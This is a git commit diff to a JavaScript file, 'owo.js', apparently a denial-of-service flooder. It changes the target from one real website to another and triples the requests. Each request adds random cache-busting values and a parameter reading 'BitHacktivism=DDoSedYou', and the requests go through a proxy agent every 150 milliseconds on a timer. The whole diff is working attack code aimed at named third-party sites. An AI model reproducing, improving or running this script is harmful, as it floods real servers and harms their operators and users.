81ad50fd9d5890bed6fdcfb92f3cbc54ba1103fc
SwxtchCode <swxtchcode@protonmail.com>
2020-11-29 15:08:41 -0800

    Update owo.js

--- owo.js
+++ owo.js
@@ -12,8 +12,12 @@ yeet = () => {
         
    var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
   var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
-fetch("https://combolists.coffee/wp-content/uploads/2020/04/cropped-EU2xmPdXgAAmhQg.jpg?daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
+fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
+  fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
+fetch("https://leakzone.net/uploads/avatars/avatar_14107.png?dateline=1591716527&daKillaOfZeeCache=%229" + ".342761167298337e+43NaN" + rand1 + rand2 + "&BitHacktivism=DDoSedYou", {agent});
+
 }
+
 
 setInterval(yeet, 150);
 
